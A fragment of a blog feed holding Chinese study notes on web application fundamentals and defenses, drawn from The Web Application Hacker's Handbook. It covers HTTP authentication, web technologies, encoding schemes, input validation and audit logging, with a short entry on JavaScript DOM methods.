title="HTTP身份验证"></a>HTTP身份验证</h3><p>HTTP拥有自己的用户身份验证机制，使用不同的身份验证方案。</p><ul><li><font color="#fb8c00">Basic</font> 这是一种非常简单的身份验证机制，它在请求消息头中随每条消息以Base64编码字符串的形式发送用户证书</li><li><font color="#fb8c00">NTML</font> 这是一种质询-响应式机制。它使用某个Windows NTML协议版本</li><li><font color="#fb8c00">Digest</font> 这是一种质询-响应式机制。它随用户证书一起使用一个随机值MD5校验和。</li></ul><blockquote><p>注：“基本身份验证并不安全”这种观点是错误的，可以使用HTTPS作为传输机制，防止任何HTTP消息收到窃听攻击。</p></blockquote><h2 id="Web功能"><a href="#Web功能" class="headerlink" title="Web功能"></a>Web功能</h2><h3 id="服务器端功能"><a href="#服务器端功能" class="headerlink" title="服务器端功能"></a>服务器端功能</h3><ul><li>静态资源：Web站点有相当数量的静态资源，当用户提交请求时，只需将它们加载到Web服务器，再传送给用户即可。(只由静态资源组成的Web站点，每次用户请求某个特殊的资源时，服务器都会返回相同的内容)，如HTML页面与图片。</li><li>动态资源：如今的Web应用程序主要向用户提供动态生成的内容，当用户请求一个动态资源时，服务器会动态建立响应，每个用户都会收到满足其特点需求的内容。</li><li>动态内容：动态内容由在服务器上执行的脚本或其他代码生成。在形式上，这些脚本类似于计算机程序，它们收到各种输入，并处理输入，然后向用户返回输出结果。</li><li>当用户的浏览器提出访问动态资源的请求时，它并不仅仅是要求访问该资源的副本。通常，它还会随请求提交各种参数。正是这些参数保证了服务器端应用程序能够生成适合各种用户的需求的内容。HTTP请求使用的3种主要方式向应用程序传送参数：</li></ul><ol><li>通过URL查询字符串</li><li>通过REST风格的URL的文件路径</li><li>通过HTTPcookie</li><li>通过在请求主体中使用POST方法</li></ol><p>Web应用程序在服务器端使用大量的技术实现其功能，这些技术包括：</p><ul><li>脚本语言，如PHP,VBScript,Perl</li><li>Web应用程序平台，如ASP.NET和Java</li><li>Web服务器，如Apache、IIS和Netscape Enterprise</li><li>数据库，如Oracle和MySQL</li><li>其他后端组件，如文件系统、基于SOAP的Web服务和目录服务</li></ul><p>####　Java平台</p><h5 id="专业术语解释"><a href="#专业术语解释" class="headerlink" title="专业术语解释"></a>专业术语解释</h5><ul><li>Enterprise Java Bean(EJB)是一个相对重量级的软件组件，它将一个特殊业务功能的逻辑组合到应用程序中</li><li>简单传统的java对象(Plain Old Java Object,POJO)是一个普通的Java对象</li><li>Java Servelt是应用程序服务器中的一个对象，它接收客户端的HTTP请求并返回HTTP响应。</li><li>Java Web容器是一个为基于java的Web应用程序提供运行时环境的平台和引擎Apacha属于Web容器</li></ul><h5 id="Java-Web应用程序"><a href="#Java-Web应用程序" class="headerlink" title="Java Web应用程序"></a>Java Web应用程序</h5><p>许多Java Web应用程序在定制代码中使用第三方与开源组件。关键应用程序功能常用的组件包括：</p><ul><li>身份验证：JAAS,ACEGI</li><li>表示层：SiteMesh,Tapestry</li><li>数据库对象关系映射：Hibernate</li><li>日志：Log4J</li></ul><h4 id="ASP-NET"><a href="#ASP-NET" class="headerlink" title="ASP.NET"></a>ASP.NET</h4><ul><li>ASP.NET是Microsoft开发的一种Web应用程序框架</li><li>ASP.NET使用Microsoft的.NET Framework，提供一个虚拟机[CLR]与一组强大的API。因此，ASP.NET可以用任何.NET语言来写(C#,VB.NET)</li></ul><h4 id="PHP"><a href="#PHP" class="headerlink" title="PHP"></a>PHP</h4><p>PHP为常用的应用程序功能提供了现成的解决方案，并将其整合到应用更加广泛的定制应用程序中，如：</p><ul><li>公告牌：PHPBB,PHP-Nuke</li><li>管理前端：PHPMyAdmin</li><li>Web邮件：SquirrlMain,IlohaMail</li><li>相册：Gallery</li><li>购物车：osCommerce,ECW-Shop</li><li>维客：Media Wiki,Wakka Wikki</li></ul><h4 id="Ruby-On-Rails"><a href="#Ruby-On-Rails" class="headerlink" title="Ruby On Rails"></a>Ruby On Rails</h4><p>主要侧重于模型-视图-控制器体系架构。Rails的主要优势在于，使用它能够以极快的速度创建成熟的数据驱动应用程序</p><h4 id="SQL"><a href="#SQL" class="headerlink" title="SQL"></a>SQL</h4><p>结构化查询语句(SQL)用于访问Qracle,MySQL等数据库中的数据。目前，绝大多数的Web应用程序都将基于SQL的数据库作为它们后端的数据库</p><h4 id="XML"><a href="#XML" class="headerlink" title="XML"></a>XML</h4><p>可扩展标记语言(XML)是一种机器可读格式的数据编码规范，其语法与HTML类似，XML之所以可扩展，是因为它可以使用任意数量的标签和属性名。</p><h4 id="Web服务"><a href="#Web服务" class="headerlink" title="Web服务"></a>Web服务</h4><p>实际上，许多应用程序就是一组后端Web服务的GUI前端。Web服务使用简单对象访问协议(SOAP)来交换数据。通常SOAP使用HTTP协议来传送消息，并使用XML格式表示数据，服务器端应用程序使用它与各种非后端系统进行通信。</p><p>一个典型的SOAP请求：</p><pre class=" language-bash"><code class="language-bash">POST /InStock HTTP/1.1Host: www.example.orgContent-Type: application/soap+xml<span class="token punctuation">;</span> charset<span class="token operator">=</span>utf-8Content-Length: nnn<span class="token operator">&lt;</span>?xml version<span class="token operator">=</span><span class="token string">"1.0"</span>?<span class="token operator">></span><span class="token operator">&lt;</span>soap:Envelopexmlns:soap<span class="token operator">=</span><span class="token string">"http://www.w3.org/2001/12/soap-envelope"</span>soap:encodingStyle<span class="token operator">=</span><span class="token string">"http://www.w3.org/2001/12/soap-encoding"</span><span class="token operator">></span>  <span class="token operator">&lt;</span>soap:Body xmlns:m<span class="token operator">=</span><span class="token string">"http://www.example.org/stock"</span><span class="token operator">></span>    <span class="token operator">&lt;</span>m:GetStockPrice<span class="token operator">></span>      <span class="token operator">&lt;</span>m:StockName<span class="token operator">></span>IBM<span class="token operator">&lt;</span>/m:StockName<span class="token operator">></span>    <span class="token operator">&lt;</span>/m:GetStockPrice<span class="token operator">></span>  <span class="token operator">&lt;</span>/soap:Body<span class="token operator">></span><span class="token operator">&lt;</span>/soap:Envelope<span class="token operator">></span></code></pre><h3 id="客户端功能"><a href="#客户端功能" class="headerlink" title="客户端功能"></a>客户端功能</h3><p>服务器端应用程序要接收用户的输入与操作，并向用户返回其结果，它必须提供一个客户端用户界面。由于所有Web应用程序都通过Web浏览器进行访问，因此这些界面共享一个技术核心。客户端技术如下：</p><h4 id="HTML"><a href="#HTML" class="headerlink" title="HTML"></a>HTML</h4><p>HTML是建立Web界面所需的核心技术。这是一种用于描述浏览器所显示的文档结构的基于标签的语言</p><h4 id="超链接"><a href="#超链接" class="headerlink" title="超链接"></a>超链接</h4><p>客户端与服务器之间的大量通信都由客户单击超链接驱动。Web应用程序中的超链接通常包括预先设定的请求参数，这些数据项不需要用户输入，而是由服务器将其插入用户单击的超链接的目标URL中，以这种形式提交。比如</p><pre class=" language-bash"><code class="language-bash"><span class="token operator">&lt;</span>a href<span class="token operator">=</span><span class="token string">"?redit=/updates/update29.html"</span><span class="token operator">></span>What's happening?<span class="token operator">&lt;</span>/a<span class="token operator">></span></code></pre><p>当用户单击这个链接时，浏览器会提出以下请求</p><pre class=" language-bash"><code class="language-bash">GET /news/8/?redit<span class="token operator">=</span>/updates/update29.html HTTP/1.1Host: mdsec.net </code></pre><p>服务器收到查询字符串中的参数(newsid)，并使用它的值决定向用户返回什么内容</p><h4 id="表单"><a href="#表单" class="headerlink" title="表单"></a>表单</h4><p>虽然基于超链接的导航方法负责客户端与服务器之间的绝大多数通信，但许多Web应用程序还是需要采用更灵活的形式收集输入。HTML表单是一种常见的机制，允许用户通过浏览器提交任意输入。以下是一个典序的HTTP表单：</p><pre class=" language-bash"><code class="language-bash"><span class="token operator">&lt;</span>form action<span class="token operator">=</span><span class="token string">"/secure/login.php?app=quotations"</span> method<span class="token operator">=</span><span class="token string">"post"</span><span class="token operator">></span>username: <span class="token operator">&lt;</span>input type<span class="token operator">=</span><span class="token string">"text"</span> name<span class="token operator">=</span><span class="token string">"username"</span><span class="token operator">></span><span class="token operator">&lt;</span>br<span class="token operator">></span>password: <span class="token operator">&lt;</span>input type<span class="token operator">=</span><span class="token string">"password"</span> name<span class="token operator">=</span><span class="token string">"password"</span><span class="token operator">></span><span class="token operator">&lt;</span>input type<span class="token operator">=</span><span class="token string">"hidden"</span> name<span class="token operator">=</span><span class="token string">"redit"</span> value<span class="token operator">=</span><span class="token string">"/secure/home.php"</span><span class="token operator">></span><span class="token operator">&lt;</span>input type<span class="token operator">=</span><span class="token string">"submit"</span> name<span class="token operator">=</span><span class="token string">"submit"</span> value<span class="token operator">=</span><span class="token string">"log in"</span><span class="token operator">></span><span class="token operator">&lt;</span>/form<span class="token operator">></span></code></pre><p>当用户在表单中输入值并单击“提交”按钮时，浏览器将提出以下请求：</p><pre class=" language-bash"><code class="language-bash">POST /secure/login.php?app<span class="token operator">=</span>quotations HTTP/1.1Host: wahh-appContent-Type: application/x-www-form-urlencodedContent-Length: 39//包含一个Cookie<span class="token punctuation">(</span>SESS<span class="token punctuation">)</span>参数，服务器在早先的响应中将其发布给浏览器，该参数可用于控制服务器端的处理过程Cookie: SESS<span class="token operator">=</span>GTnrpx2ss2tSWSnhXJGyG0LJ47MXRsjcFM6Bd username<span class="token operator">=</span>daf<span class="token operator">&amp;</span>password<span class="token operator">=</span>foo<span class="token operator">&amp;</span>redit<span class="token operator">=</span>/secure/home.php<span class="token operator">&amp;</span>submit<span class="token operator">=</span>log+in</code></pre><h5 id="多部分编码"><a href="#多部分编码" class="headerlink" title="多部分编码"></a>多部分编码</h5><p>上述的消息主体中的内容类型为 x-<a href="http://www.form-urlencoded" target="_blank" rel="noopener">www.form-urlencoded</a> ,这表示和URL查询字符串一样，消息主体的参数也以名/值对表示。multipart/form-data是提交表单时的另一种数据类型的内容。使用方法为：</p><ul><li>在表单标签的enctype属性中要求浏览器使用多部分编码</li><li>使用这种编码形式，请求的Content-Type消息头还会指定一个随机字符串，用它来分隔请求主体中的参数</li></ul><pre class=" language-bash"><code class="language-bash">POST /secure/login.php?app<span class="token operator">=</span>quotations HTTP/1.1Host: wahh-app.comContent-Type: multipart/form-data<span class="token punctuation">;</span> boundary:------------7d71385d0a1aContent-Length: 369Cookie: SESS<span class="token operator">=</span>GTnrpx2ss2tSWSnhXJGyG0LJ47MXRsjcFM6Bd//空行-------------7d71385d0a1aContent-Disposition: form-data<span class="token punctuation">;</span> name<span class="token operator">=</span><span class="token string">"username"</span>daf------------7d71385d0a1aContent-Disposition: form-data<span class="token punctuation">;</span> name<span class="token operator">=</span><span class="token string">"password"</span>foo---------------7d71385d0a1aContent-Disposition: form-data<span class="token punctuation">;</span>name<span class="token operator">=</span><span class="token string">"redit"</span>/secure/home.php--------------------7d71385d0a1aContent-Disposition: form-data<span class="token punctuation">;</span>name<span class="token operator">=</span><span class="token string">"submit"</span>log <span class="token keyword">in</span>--------------------7d71385d0a1a</code></pre><h4 id="CSS-层叠样式表"><a href="#CSS-层叠样式表" class="headerlink" title="CSS(层叠样式表)"></a>CSS(层叠样式表)</h4><p>CSS是一种描述以标记语言编写的文档的表示形式的语言。在Web应用程序中，CSS用来指定HTML在屏幕上的呈现方式</p><h4 id="JavaScript"><a href="#JavaScript" class="headerlink" title="JavaScript"></a>JavaScript</h4><p>超链接和表单用于建立能够轻易接收大多数Web应用程序所需输入的丰富用户界面。许多应用程序使用一种更加分布式的模型，不仅用客户端提交用户数据和操作，还通过它进行具体的数据处理。JavaScript常用于执行以下任务：</p><ul><li>确认用户输入的数据，然后将其提交给服务器，避免因数据包含错误而提交不必要的请求</li><li>根据用户操作动态修改用户界面</li><li>查询并更新浏览器内的文档对象模型(DOM)</li></ul><h4 id="VBScript"><a href="#VBScript" class="headerlink" title="VBScript"></a>VBScript</h4><p>VBScript可用于替代Internet Explorer浏览器才支持的JavaScript</p><h4 id="文档对象模型-DOM"><a href="#文档对象模型-DOM" class="headerlink" title="文档对象模型(DOM)"></a>文档对象模型(DOM)</h4><ul><li>文档对象模型是可以通过其API查询和操作的HTML文档的抽象表达形式。</li><li>DOM允许客户端脚本根据id访问各个HTML元素并以编程的方式访问这些结构</li><li>DOM还可以读取和更新当前URL和Cookie等数据</li><li>DOM还包括一个事件模型，以便于代码钩住各种事件，如鼠标点击、通过超链接导航等</li><li>浏览器DOM操纵是基于Ajax的应用程序采用的关键技术</li></ul><h4 id="Ajax"><a href="#Ajax" class="headerlink" title="Ajax"></a>Ajax</h4><ul><li>Ajax是一组编程技术，用于在客户端创建旨在模拟传统桌面应用程序的流畅交互和动态行为的用户界面。</li><li>最早的Web应用程序基于完整的页面，每个用户操作，如单击链接或提交表单，都会启动窗口级别的导航事件，导致服务器加载新页面。</li><li>使用Ajax，一些用户操作将由客户端脚本代码进行处理，并且不需要重新加载页面。例如，在基于Ajax的购物应用程序中，用户点击“添加购物车”按钮，应用程序将启动一个后台请求，在服务器更新用户的购物车记录，随后，一个轻量级响应会更新用户屏幕上显示的购物车中的商品数量，但是，浏览器中的整个页面基本保持不变。</li><li>Ajax使用的核心技术为XMLHttpRequest，这种技术现在转化为一个本地的JavaScript对象，客户端可以通过该对象提出后台的请求，而无须窗口级别的导航事件。XMLHttpRequest允许在请求中发送以及在响应中接收任意数量的内容</li></ul><h4 id="JSON"><a href="#JSON" class="headerlink" title="JSON"></a>JSON</h4><ul><li><p>JavaScript对象表示法(JSON)是一种可用于对任意数据进行序列化的简单数据交换的格式。</p></li><li><p>JSON可直接由JavaScript解释器处理，Ajax应用程序常使用JSON以替换最初用于数据传输的XML格式</p></li><li><p>如果用户执行某个操作，客户端JavaScript使用XMLHttpRequest将该操作传送到服务器，服务器则返回一个包含JSON格式的数据的轻量级响应。然后，客户端脚本将处理这些数据，并对用户界面进行相应的更新</p></li><li><p>一个例子：<br>基于Ajax的Web邮件应用程序可能提供显示所选联系人详细资料的功能，如果用户单击某位联系人，浏览器将使用XMLHttpRequest检索所选联系人的详细资料，并使用JSON返回这些资料</p><pre class=" language-bash"><code class="language-bash"><span class="token punctuation">{</span>  <span class="token string">"name"</span><span class="token keyword">:</span><span class="token string">"Alice"</span>,  <span class="token string">"id"</span><span class="token keyword">:</span><span class="token string">"111111"</span>,  <span class="token string">"email"</span><span class="token keyword">:</span><span class="token string">"123@qq.com"</span><span class="token punctuation">}</span></code></pre></li><li><p>应用程序还将JSON用于封装传统上位于请求参数上的数据，如果用户更新联系人的资料，可将以下请求将新信息传送给服务器</p></li></ul><pre class=" language-bash"><code class="language-bash">POST /contacts HTTP/1.0Content-Type: application/x-www-form-urlencodedContent-Length: 89Contact<span class="token operator">=</span><span class="token punctuation">{</span><span class="token string">"name"</span><span class="token keyword">:</span><span class="token string">"Alice"</span>,<span class="token string">"id"</span><span class="token keyword">:</span><span class="token string">"111111"</span>,<span class="token string">"email"</span><span class="token keyword">:</span><span class="token string">"123@qq.com"</span><span class="token punctuation">}</span><span class="token operator">&amp;</span>submit<span class="token operator">=</span>update</code></pre><h4 id="同源策略"><a href="#同源策略" class="headerlink" title="同源策略"></a>同源策略</h4><p>同源策略是浏览器实施的一种关键机制，主要用于防止不同来源的内容相互干扰。从一个网站收到的内容可以读取和修改从该站点收到的其他内容，但不得访问从其他站点收到的内容。同源策略的特点如下：</p><ul><li>一个域的页面可以向另一个域的页面提交任意数量的请求(eg.通过提交表单或加载图像)，但该页面本身无法处理上述请求返回的数据</li><li>一个域的页面可以加载来自其他域的脚本并在自己的域内运行这个脚本。这是因为脚本被假定为包含代码，而非数据，因此跨域访问不会泄露任何敏感信息。</li><li>位于一个域的页面无法读取或修改属于另一个域的cookie或其他DOM数据</li></ul><h2 id="编码方案"><a href="#编码方案" class="headerlink" title="编码方案"></a>编码方案</h2><h3 id="URL编码"><a href="#URL编码" class="headerlink" title="URL编码"></a>URL编码</h3><ul><li>URL只允许使用US-ASCII字符集中的可打印字符(也就是ASCII代码在0x20~0x7e范围内的字符)，由于其在URL方案或HTTP协议内具有特殊含义，这个范围内的一些字符也不能使用。</li><li>URL编码方案用于对扩展ASCII字符集中任何有问题的字符进行编码，使其可通过HTTP传输</li><li>任何用URL编码的字符都以%为前缀，其后是该字符的两位十六进制ASCII代码<pre class=" language-bash"><code class="language-bash">%3d 代表<span class="token string">"="</span>%25 代表<span class="token string">"%"</span>%20 代表空格%0a 代表新行%00 代表空字节</code></pre></li></ul><blockquote><p>注：编码字符加号(+)代表URL编码的空格(与%20一样)</p></blockquote><h3 id="Unicode编码"><a href="#Unicode编码" class="headerlink" title="Unicode编码"></a>Unicode编码</h3><ul><li>16位的Unicode编码的工作原理与URL编码类似</li><li>为通过HTTP进行传输，16位的Unicode编码字符以%u为前缀，其后是这个字符的十六进制Unicode码<pre class=" language-bash"><code class="language-bash">%u2215 表示/</code></pre></li><li>UTF-8是一种长度可变的编码标准，它使用一个字节或几个字节表示每个字符</li><li>为通过HTTP传输，UTF-8编码的多字节字符以%为前缀，其后用十六进制表示每个字节<pre class=" language-bash"><code class="language-bash">%e2%89%a0代表≠</code></pre></li></ul><h3 id="HTML编码"><a href="#HTML编码" class="headerlink" title="HTML编码"></a>HTML编码</h3><ul><li>HTML编码是一种用于表示问题字符以将其安全并入HTML文档的方案</li><li>HTML编码定义了大量HTML实体来表示特殊的字面量字符<pre class=" language-bash"><code class="language-bash"><span class="token operator">&amp;</span>quot<span class="token punctuation">;</span> 代表"<span class="token operator">&amp;</span>apos<span class="token punctuation">;</span> 代表'<span class="token operator">&amp;</span>amp<span class="token punctuation">;</span> 代表<span class="token operator">&amp;</span><span class="token operator">&amp;</span>lt<span class="token punctuation">;</span> 代表<span class="token operator">&lt;</span><span class="token operator">&amp;</span>gt<span class="token punctuation">;</span> 代表<span class="token operator">></span></code></pre></li><li>任何字符都可以使用它的十进制ASCII码进行HTML编码<pre class=" language-bash"><code class="language-bash"><span class="token operator">&amp;</span><span class="token comment" spellcheck="true">#34; 代表"</span><span class="token comment" spellcheck="true">#39; 代表'</span></code></pre></li><li>或者可以使用十六进制的ASCII码(以x为前缀)<pre class=" language-bash"><code class="language-bash"><span class="token operator">&amp;</span><span class="token comment" spellcheck="true">#x22; 代表"</span><span class="token operator">&amp;</span><span class="token comment" spellcheck="true">#x27; 代表'</span></code></pre></li></ul><h3 id="Base64编码"><a href="#Base64编码" class="headerlink" title="Base64编码"></a>Base64编码</h3><ul><li>Base64仅用一个可打印的ASCII字符就可安全转换成任何二进制数据</li><li>Base64编码将输入数据转换为3个字节块，每个块被划分为4段，每段6个数据位。这6个数据位有64种不同的排列组合，因此每个段可使用一组64个字符表示</li><li>如果最后输入数据块不能构成3段输出数据，就用一个或两个等号(=)补足输出</li></ul><h3 id="十六进制编码"><a href="#十六进制编码" class="headerlink" title="十六进制编码"></a>十六进制编码</h3><p>许多应用程序在传送二进制数据时直接使用十六机制编码，用ASCII字符表示十六进制数据块，例如对cookie中用户名daf进行十六进制编码，其结果如下:</p><pre class=" language-bash"><code class="language-bash">646166</code></pre>]]></content>
      
      
      <categories>
          
          <category> 安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Web </tag>
            
            <tag> 安全 </tag>
            
            <tag> 计算机网络 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Web安全(1)</title>
      <link href="/2019/10/14/websecurity1/"/>
      <url>/2019/10/14/websecurity1/</url>
      
        <content type="html"><![CDATA[<h2 id="说在前面"><a href="#说在前面" class="headerlink" title="说在前面"></a>说在前面</h2><p>博客里所有Web安全系列的文章均为博主对黑客攻防技术宝典:Web实战篇(The Web Application Hacker’s Handbook)所做的读书笔记。</p><h2 id="Web应用程序防御机制"><a href="#Web应用程序防御机制" class="headerlink" title="Web应用程序防御机制"></a>Web应用程序防御机制</h2><p>Web应用程序采用的防御机制由以下几个核心因素构成：</p><ul><li>处理用户访问应用程序的数据和功能，防止用户获得未授权访问。</li><li>处理用户对应用程序功能的输入，防止错误输入造成不良行为</li><li>防范攻击者，确保应用程序在成为直接攻击目标时能够正常运转，并采取适当的防御和攻击挫败攻击者。</li><li>管理应用程序本身，帮助管理员监控其行为，配置其功能</li></ul><h2 id="处理用户访问"><a href="#处理用户访问" class="headerlink" title="处理用户访问"></a>处理用户访问</h2><p>大多数Web应用程序使用三层相互关联的安全机制处理用户访问：</p><ul><li>身份验证</li><li>会话管理</li><li>访问机制</li></ul><h3 id="身份验证"><a href="#身份验证" class="headerlink" title="身份验证"></a>身份验证</h3><ul><li>如果不采取身份验证，应用程序会把所有用户作为匿名用户处理，这是最低一级的信任。</li><li>绝大多数的应用程序都采取传统的身份验证模型，即要求用户提交用户名和密码。</li></ul><h3 id="会话管理"><a href="#会话管理" class="headerlink" title="会话管理"></a>会话管理</h3><ul><li>成功登录应用程序后，用户会访问各种页面和功能，从浏览器提出一系列http请求。与此同时，应用程序还会收到各类用户(包括通过验证的用户和匿名用户)发出的无数请求</li><li>为实施有效的访问控制，应用程序需要识别并处理每一名用户提交的各种请求</li><li>为满足以上要求，几乎所有Web应用程序都会为每个用户创立一个会话，并向用户发布一个标识会话的令牌。</li><li>会话本身是一组保存在服务器上的数据结构，用于追踪用户与应用程序的交互状态</li><li>令牌是一个唯一的字符串，应用程序将其映射到会话中。</li><li>当用户收到一个令牌时，浏览器会在随后的Http请求中将它返回给服务器，帮助应用程序将请求与该用户联系起来。</li><li>如果一段时间内用户没有发出请求，会话将自动终止。</li></ul><h4 id="令牌攻击"><a href="#令牌攻击" class="headerlink" title="令牌攻击"></a>令牌攻击</h4><ul><li>会话管理机制的有效性基本取决于其令牌的安全性，绝大多数针对它的攻击都企图攻破其他用户的令牌，如果令牌被攻破，攻击者就可以伪装成被攻破的用户，像已经通过验证的用户一样使用应用程序。</li><li>令牌生成过程中存在的缺陷是主要的漏洞来源，使攻击者能够推测出发布给其他用户的令牌。</li><li>少数应用程序不会向用户发布会话令牌，而是通过其他方法在多个请求中反复确认用户的身份，如果使用HTTP的内置身份验证机制，那么浏览器会自动在每个请求中反复提交用户证书，帮助应用程序直接通过这些请求识别用户。</li><li>在其他情况下，应用程序会将状态信息保存在客户端而非服务器上，通常还需要对这些信息进行加密。</li></ul><h3 id="访问控制"><a href="#访问控制" class="headerlink" title="访问控制"></a>访问控制</h3><ul><li>如果身份验证和会话管理运作正常，应用程序即可从收到的每一个请求确认用户身份，在此基础上，应用程序需要决定是否授权用户执行其所请求的操作或访问相关的数据</li><li>应用程序可支持无数不同的用户的角色，每种角色都拥有特定的权限，每名用户只允许访问应用程序中的部分数据。</li></ul><h2 id="处理用户输入"><a href="#处理用户输入" class="headerlink" title="处理用户输入"></a>处理用户输入</h2><ul><li>一个基本的安全问题：所有用户输入都不可信</li><li>大量针对Web应用程序的不同攻击都与提交错误输入有关。</li><li>确认输入(input validation)是防御这些攻击的必要手段</li></ul><h3 id="输入处理方法"><a href="#输入处理方法" class="headerlink" title="输入处理方法"></a>输入处理方法</h3><h4 id="拒绝已知的不良输入"><a href="#拒绝已知的不良输入" class="headerlink" title="拒绝已知的不良输入"></a>拒绝已知的不良输入</h4><p>这种方法一般使用一个黑名单，其中包含一组在攻击中使用 的已知的字面量字符串或模式。确认机制组织任何与黑名单匹配的数据，并接受其他数据。</p><h4 id="接受已知的正常输入"><a href="#接受已知的正常输入" class="headerlink" title="接受已知的正常输入"></a>接受已知的正常输入</h4><p>这种方法使用一个白名单，其中包含仅与良性输入匹配的一组字面量字符串、模式或一组标准。确认机制接受任何与白名单匹配的数据，并阻止其他数据</p><h4 id="净化"><a href="#净化" class="headerlink" title="净化"></a>净化</h4><p>这种方法认可有时需要接受无法保证其安全的数据，应用程序并不拒绝这种输入，相反，它以各种方式对其进行净化，防止它造成任何不利的影响。数据中可能存在的恶意字符被彻底删除，只留下已知的安全的字符，或者进一步处理前对它们进行适当的编码或”转义”。</p><h4 id="安全数据的处理"><a href="#安全数据的处理" class="headerlink" title="安全数据的处理"></a>安全数据的处理</h4><p>有时不需要确认输入本身，只需确保处理过程的绝对安全，即可避免这些漏洞。有些时候，可使用安全的编程方法避免常见的问题。</p><h4 id="语法检查"><a href="#语法检查" class="headerlink" title="语法检查"></a>语法检查</h4><p>在一些漏洞中，攻击者提交的输入与普通的非恶意用户提交的输入完全相同，之所以称为恶意输入，是因为攻击者提交的动机不同，例如，攻击者可能会修改通过隐藏表单字段提交的账号，企图访问其他用户的银行账号，这时，再多的语法确认也无法区别用户与攻击者的数据。为防止未授权访问，应用程序必须确认所提交的账号属于之前提交该账户的用户。</p><h3 id="边界确认"><a href="#边界确认" class="headerlink" title="边界确认"></a>边界确认</h3><ul><li>服务器端应用程序第一次收到用户数据的地方是一个重要的信任边界，应用程序需要在此采取措施防御恶意输入</li><li>鉴于核心问题的本质，可以基于互联网与服务器端应用程序之间的边界来考虑输入确认问题。</li></ul><h2 id="处理攻击者"><a href="#处理攻击者" class="headerlink" title="处理攻击者"></a>处理攻击者</h2><p>为处理攻击者而采取的措施一般由以下任务组成：</p><ol><li>处理错误</li><li>维护审计日志</li><li>向管理员发出警报</li><li>应对攻击</li></ol><h3 id="处理错误"><a href="#处理错误" class="headerlink" title="处理错误"></a>处理错误</h3><ul><li>大多数Web开发语言通过try-catch块和受查异常提供良好的错误处理支持。</li><li>可以配置大多数应用程序服务器，使其以自定义方式处理无法处理的应用程序错误。</li><li>过于详细的错误信息会成为攻击者从应用程序窃取数据的重要渠道。</li><li>有效的错误处理措施通常与应用程序的日志机制整合在一起，后者尽可能地记录与无法预料的错误有关的调试信息。</li></ul><h3 id="维护审计日志"><a href="#维护审计日志" class="headerlink" title="维护审计日志"></a>维护审计日志</h3><h4 id="日志"><a href="#日志" class="headerlink" title="日志"></a>日志</h4><p>计算机系统日志：在现代社会里，为了维护自身系统资源的运行状况，计算机系统一般都会有相应的日志记录系统有关日常事件或者误操作警报的日期及时间戳信息。(此释义取自百度百科)</p><h4 id="审计日志-audit-log"><a href="#审计日志-audit-log" class="headerlink" title="审计日志(audit log)"></a>审计日志(audit log)</h4><p>在任何注重安全的应用程序中，日志应记录所有重要事件，一般这些事件应至少包括以下几项：</p><ul><li>所有与身份验证功能有关的事件，如成功或失败登录、密码修改</li><li>关键交易，如信用卡支付与转账</li><li>被访问控制机制阻止的访问企图</li><li>任何包含已知攻击字符串，公然表明恶意意图的请求。<br>有效的审计日志功能一般会记录每个事件的发生时间、发出请求的IP地址和用户账户(如果通过验证)。这些日志必须受到严格的保护，避免未授权的读取或写入访问。</li></ul><h3 id="向管理员发出警报"><a href="#向管理员发出警报" class="headerlink" title="向管理员发出警报"></a>向管理员发出警报</h3><p>许多时候我们希望对攻击者的攻击行为立即采取行动，实时响应攻击企图。，可以将实际影响降到最低。警报机制必须保证既能准确报告每次的真实攻击，又不会生成过多警报，造成它们被管理员忽略。警报监控的反常事件一般包括以下几种：</p><ul><li>应用反常，如收到由单独一个IP地址或用户发出的大量请求，表明应用程序正在受到自定义攻击。</li><li>交易反常，如单独一个银行账户所转入或转出的资金数量出现异常。</li><li>包含已知攻击字符串的请求。</li><li>请求中普通用户无法查看的数据被修改。</li></ul>]]></content>
      
      
      <categories>
          
          <category> 安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Web </tag>
            
            <tag> 安全 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>javascript3</title>
      <link href="/2019/10/14/javascript3/"/>
      <url>/2019/10/14/javascript3/</url>
      
        <content type="html"><![CDATA[<h2 id="DOM结构"><a href="#DOM结构" class="headerlink" title="DOM结构"></a>DOM结构</h2><ul><li>HTML就是一个结构化的节点集合。每个节点都有一个类型。</li><li>当网页被加载时，浏览器会创建页面的文档对象模型（Document Object Model）。 </li><li>HTML DOM 模型被构造为对象的树：<br><img src="https://i.postimg.cc/bvCfQBTy/1.gif" alt=""><br>该图来源菜鸟教程</li></ul><h3 id="访问DOM元素"><a href="#访问DOM元素" class="headerlink" title="访问DOM元素"></a>访问DOM元素</h3><h4 id="访问单个元素"><a href="#访问单个元素" class="headerlink" title="访问单个元素"></a>访问单个元素</h4><pre class=" language-bash"><code class="language-bash">document.getElementById<span class="token punctuation">(</span><span class="token string">'everywhere'</span><span class="token punctuation">)</span></code></pre><p>该方法只能用于文档对象，可以找出所有ID等于everywhere的元素</p><pre class=" language-bash"><code class="language-bash">document.getElementsByTagName<span class="token punctuation">(</span><span class="token string">'li'</span><span class="token punctuation">)</span></code></pre><p>该方法可以用于任意元素，它可以找出拥有li标签名的所有后代元素，并将其作为实时变化的NodeList(基本数等同于数组)返回</p><pre class=" language-bash"><code class="language-bash">document.getElementsByClassName<span class="token punctuation">(</span><span class="token string">'test'</span><span class="token punctuation">)</span></code></pre><p>该方法运用在Element的所有实例上，它返回一个包含所有匹配元素的实时变化的HTMLCollection</p><h4 id="等待HTML-DOM载入"><a href="#等待HTML-DOM载入" class="headerlink" title="等待HTML DOM载入"></a>等待HTML DOM载入</h4><p>浏览器的内部操作顺序如下：</p><ol><li>解析HTML</li><li>载入外部样式表</li><li>按照解析文档时的结果执行脚本</li><li>构建好完整的HTML DOM</li><li>载入图片以及外部内容</li><li>页面载入完成</li></ol><h3 id="获取元素内容"><a href="#获取元素内容" class="headerlink" title="获取元素内容"></a>获取元素内容</h3>]]></content>
      
      
      <categories>
          
          <category> 编程语言 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> javascript </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>javascript(2)</title>
      <link href="/2019/10/11/javascript2/"/>
      <url>/2019/10/11/javascript2/</url>
      
